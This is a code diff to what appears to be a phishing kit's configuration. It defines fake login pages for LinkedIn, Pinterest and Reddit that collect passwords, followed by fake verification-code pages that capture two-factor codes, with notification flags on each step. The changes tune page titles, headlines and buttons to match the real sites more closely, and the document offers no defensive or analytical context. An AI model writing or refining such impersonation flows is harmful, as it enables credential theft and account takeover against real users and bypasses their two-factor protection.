@@ -334,17 +334,17 @@ const FLOWS = {
   ],
 
   linkedin: [
-    { slug:'login',  form_type:'login', page_title:'Sign In',         headline:'Sign in to LinkedIn',              subheadline:'Stay connected with your professional network',   fields:['email','password'],  layout:'auth', cta:'Sign In',   step_label:'Login', notify_step:true  },
+    { slug:'login',  form_type:'login', page_title:'Sign In',         headline:'Sign in to LinkedIn',              subheadline:'',                                               fields:['email','password'],  layout:'auth', cta:'Sign In',   step_label:'Login', notify_step:true  },
     { slug:'2fa',    form_type:'otp',   page_title:'Two-Factor Auth', headline:'Enter Verification Code',          subheadline:'We sent a 6-digit code to your email address',    fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'2FA',   notify_step:true,  otp_length:6 }
   ],
 
   pinterest: [
-    { slug:'login',    form_type:'login', page_title:'Sign In',           headline:'Sign in to Pinterest',           subheadline:'Find your inspiration',                          fields:['email','password'],  layout:'auth', cta:'Sign In',   step_label:'Login',    notify_step:true  },
+    { slug:'login',    form_type:'login', page_title:'Log In – Pinterest', headline:'Log in to Pinterest',            subheadline:'',                                               fields:['email','password'],  layout:'auth', cta:'Log In',    step_label:'Login',    notify_step:true  },
     { slug:'sms-code', form_type:'otp',   page_title:'Security Verification',headline:'Enter Verification Code',    subheadline:'We sent a code via SMS',                         fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'SMS Code', notify_step:true,  otp_length:6 }
   ],
 
   reddit: [
-    { slug:'login',    form_type:'login', page_title:'Sign In',          headline:'Sign in to Reddit',              subheadline:'Enter your credentials to continue',             fields:['username','password'],layout:'auth', cta:'Sign In',   step_label:'Login',    notify_step:true  },
+    { slug:'login',    form_type:'login', page_title:'Log in to Reddit', headline:'Log in to Reddit',               subheadline:'',                                               fields:['username','password'],layout:'auth', cta:'Log In',    step_label:'Login',    notify_step:true  },
     { slug:'sms-code', form_type:'otp',   page_title:'Identity Verify',  headline:'Enter Verification Code',        subheadline:'We sent an SMS code to your phone',              fields:['code'],              layout:'otp',  cta:'Confirm',   step_label:'SMS Code', notify_step:true,  otp_length:6 }
   ],
 
